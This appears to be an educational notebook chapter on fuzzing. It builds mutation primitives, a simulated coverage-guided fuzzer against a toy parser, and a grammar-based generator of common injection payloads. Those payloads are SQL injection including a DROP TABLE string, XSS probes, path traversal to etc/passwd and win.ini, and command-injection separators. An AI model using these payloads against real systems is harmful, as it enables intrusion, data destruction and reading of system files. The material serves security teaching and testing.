# 03 — Fuzzing and Payload Mutation

## What This Is
Fuzzing automatically generates malformed or unexpected inputs to find bugs, crashes, and security vulnerabilities. Coverage-guided fuzzing (AFL, libFuzzer) uses branch coverage feedback to steer generation toward unexplored code paths.

## Why It Matters
Fuzzing discovered Heartbleed-class bugs, memory corruption in browsers, and parser vulnerabilities across critical infrastructure. Modern fuzzing is table stakes for any serious security programme.

## Where the Community Stands
AFL++ and libFuzzer dominate native fuzzing. Python applications use Hypothesis (property-based testing) and custom mutators. LLM-guided fuzzing is emerging — models propose semantically valid inputs that still violate parser assumptions.

## Authorized Testing Context
All payload generation here is for controlled environments: local test targets, authorized pentest labs, and research. Never point mutation engines at systems you do not own or have written permission to test.

In [ ]:
import random
import struct
import hashlib
import string
from dataclasses import dataclass, field
from typing import List, Callable, Optional, Tuple
import statistics

# Mutation strategies
MUTATION_OPS = [
    'bit_flip', 'byte_flip', 'byte_insert', 'byte_delete',
    'chunk_dup', 'chunk_del', 'interesting_values', 'splice'
]

INTERESTING_8  = [0, 1, 127, 128, 255]
INTERESTING_16 = [0, 1, 256, 32767, 32768, 65535]
INTERESTING_32 = [0, 1, 2**31-1, 2**31, 2**32-1]

def bit_flip(data: bytes, pos: int) -> bytes:
    buf = bytearray(data)
    byte_pos = pos // 8
    bit_pos  = pos %  8
    buf[byte_pos] ^= (1 << bit_pos)
    return bytes(buf)

def byte_flip(data: bytes, pos: int) -> bytes:
    buf = bytearray(data)
    buf[pos] ^= 0xFF
    return bytes(buf)

def insert_interesting(data: bytes, pos: int, width: int = 1) -> bytes:
    if width == 1:
        val = random.choice(INTERESTING_8)
        blob = bytes([val])
    elif width == 2:
        val = random.choice(INTERESTING_16)
        blob = struct.pack('<H', val)
    else:
        val = random.choice(INTERESTING_32)
        blob = struct.pack('<I', val & 0xFFFFFFFF)
    return data[:pos] + blob + data[pos+width:]

def chunk_dup(data: bytes, src: int, dst: int, length: int) -> bytes:
    chunk = data[src:src+length]
    return data[:dst] + chunk + data[dst:]

def chunk_del(data: bytes, pos: int, length: int) -> bytes:
    return data[:pos] + data[pos+length:]

print('Mutation primitives defined')

## Coverage-Guided Feedback Loop
Real fuzzers (AFL++) maintain a corpus of inputs that hit new coverage edges. We simulate this: keep inputs that cover new simulated 'branches', discard duplicates.

In [ ]:
@dataclass
class FuzzInput:
    data: bytes
    coverage: frozenset
    parent_hash: Optional[str] = None

class CoverageGuidedFuzzer:
    def __init__(self, target_fn: Callable[[bytes], frozenset], seed_corpus: List[bytes]):
        self.target_fn   = target_fn
        self.corpus: List[FuzzInput] = []
        self.global_coverage: set = set()
        self.crashes: List[bytes] = []
        self.total_execs = 0
        for seed in seed_corpus:
            cov = target_fn(seed)
            fi  = FuzzInput(data=seed, coverage=frozenset(cov))
            self.corpus.append(fi)
            self.global_coverage |= cov

    def _mutate(self, data: bytes) -> bytes:
        op = random.choice(MUTATION_OPS)
        if not data:
            return bytes([random.randint(0, 255)])
        if op == 'bit_flip':
            pos = random.randint(0, len(data)*8-1)
            return bit_flip(data, pos)
        elif op == 'byte_flip':
            pos = random.randint(0, len(data)-1)
            return byte_flip(data, pos)
        elif op == 'byte_insert':
            pos = random.randint(0, len(data))
            return data[:pos] + bytes([random.randint(0,255)]) + data[pos:]
        elif op == 'byte_delete' and len(data) > 1:
            pos = random.randint(0, len(data)-1)
            return data[:pos] + data[pos+1:]
        elif op == 'interesting_values':
            width = random.choice([1,2,4])
            if len(data) >= width:
                pos = random.randint(0, max(0, len(data)-width))
                return insert_interesting(data, pos, width)
        elif op == 'chunk_dup' and len(data) > 2:
            src    = random.randint(0, len(data)-1)
            length = random.randint(1, min(8, len(data)-src))
            dst    = random.randint(0, len(data))
            return chunk_dup(data, src, dst, length)
        elif op == 'chunk_del' and len(data) > 2:
            pos    = random.randint(0, len(data)-1)
            length = random.randint(1, min(4, len(data)-pos))
            return chunk_del(data, pos, length)
        elif op == 'splice' and len(self.corpus) > 1:
            other = random.choice(self.corpus).data
            split = random.randint(0, min(len(data), len(other)))
            return data[:split] + other[split:]
        return data  # fallback: no-op

    def run(self, iterations: int = 500) -> dict:
        new_cov_inputs = 0
        for _ in range(iterations):
            parent  = random.choice(self.corpus)
            mutant  = self._mutate(parent.data)
            self.total_execs += 1
            try:
                cov = self.target_fn(mutant)
            except Exception as e:
                self.crashes.append(mutant)
                continue
            new_edges = cov - self.global_coverage
            if new_edges:
                self.global_coverage |= new_edges
                self.corpus.append(FuzzInput(data=mutant, coverage=frozenset(cov)))
                new_cov_inputs += 1
        return {
            'total_executions': self.total_execs,
            'corpus_size':      len(self.corpus),
            'total_coverage':   len(self.global_coverage),
            'new_cov_inputs':   new_cov_inputs,
            'crashes':          len(self.crashes),
        }

# --- Simulated target: a simple parser with 5 code paths ---
def simulated_parser(data: bytes) -> frozenset:
    edges = set()
    if not data:
        edges.add('empty')
        return frozenset(edges)
    edges.add('non_empty')
    if data[0] == 0x7F:
        edges.add('magic_byte')
        if len(data) > 4:
            edges.add('header_ok')
            size = struct.unpack_from('<I', data, 1)[0]
            if size == 0:
                edges.add('zero_size')
                raise RuntimeError('zero-size crash!')  # simulated crash
            if size > 0xFFFF:
                edges.add('large_size')
    if len(data) > 100:
        edges.add('long_input')
    if b'\x00' in data:
        edges.add('null_byte')
    return frozenset(edges)

seeds = [b'hello', b'\x7F\x00\x00\x00\x10', b'A'*50]
fuzzer = CoverageGuidedFuzzer(simulated_parser, seeds)
results = fuzzer.run(1000)
for k,v in results.items():
    print(f'  {k}: {v}')

## Structured Payload Templates
Beyond random mutation, structured fuzzing generates inputs that respect a grammar. This is essential for protocols (HTTP, TLS) and formats (JSON, XML) where random bytes are immediately rejected.

In [ ]:
class StructuredPayloadGenerator:
    """Grammar-based generator for common injection payload classes."""

    SQL_TEMPLATES = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE {table};--",
        "' UNION SELECT {cols}--",
        "' AND SLEEP({n})--",
        "1; WAITFOR DELAY '0:0:{n}'",
    ]

    XSS_TEMPLATES = [
        "<script>alert('{tag}')</script>",
        "<img src=x onerror=alert('{tag}')>",
        "javascript:alert('{tag}')",
        "'\"><svg onload=alert('{tag}')>",
    ]

    PATH_TEMPLATES = [
        "../" * n + "etc/passwd" for n in range(1, 6)
    ] + [
        "..\\" * n + "windows\\win.ini" for n in range(1, 4)
    ]

    CMD_TEMPLATES = [
        "; id",
        "| id",
        "&& id",
        "`id`",
        "$(id)",
        "; sleep {n}",
    ]

    def generate_sql(self, table='users', cols='null,null,null') -> List[str]:
        payloads = []
        for t in self.SQL_TEMPLATES:
            payloads.append(t.format(table=table, cols=cols,
                                     n=random.randint(1,5)))
        return payloads

    def generate_xss(self, tag='XSS') -> List[str]:
        return [t.format(tag=tag) for t in self.XSS_TEMPLATES]

    def generate_path(self) -> List[str]:
        return list(self.PATH_TEMPLATES)

    def generate_cmd(self) -> List[str]:
        return [t.format(n=random.randint(1,5)) for t in self.CMD_TEMPLATES]

    def all_payloads(self) -> dict:
        return {
            'sql_injection':   self.generate_sql(),
            'xss':             self.generate_xss(),
            'path_traversal':  self.generate_path(),
            'cmd_injection':   self.generate_cmd(),
        }

gen = StructuredPayloadGenerator()
payloads = gen.all_payloads()
for category, items in payloads.items():
    print(f'\n{category} ({len(items)} payloads):')
    for p in items[:3]:
        print(f'  {repr(p)}')

## Fuzzing Effectiveness Metrics
Key metrics: executions/sec (throughput), unique crashes (bugs found), corpus growth rate (exploration), and coverage percentage.

In [ ]:
def fuzzing_report(results: dict, target_coverage: int = 10) -> None:
    pct = results['total_coverage'] / target_coverage * 100
    print('=== Fuzzing Campaign Report ===')
    print(f"  Executions:       {results['total_executions']}")
    print(f"  Corpus size:      {results['corpus_size']}")
    print(f"  Coverage edges:   {results['total_coverage']} / {target_coverage} ({pct:.0f}%)")
    print(f"  New cov inputs:   {results['new_cov_inputs']}")
    print(f"  Crashes found:    {results['crashes']}")
    status = 'GOOD' if pct >= 80 else ('PARTIAL' if pct >= 50 else 'LOW')
    print(f"  Coverage status:  {status}")

fuzzing_report(results, target_coverage=9)  # 9 simulated edges total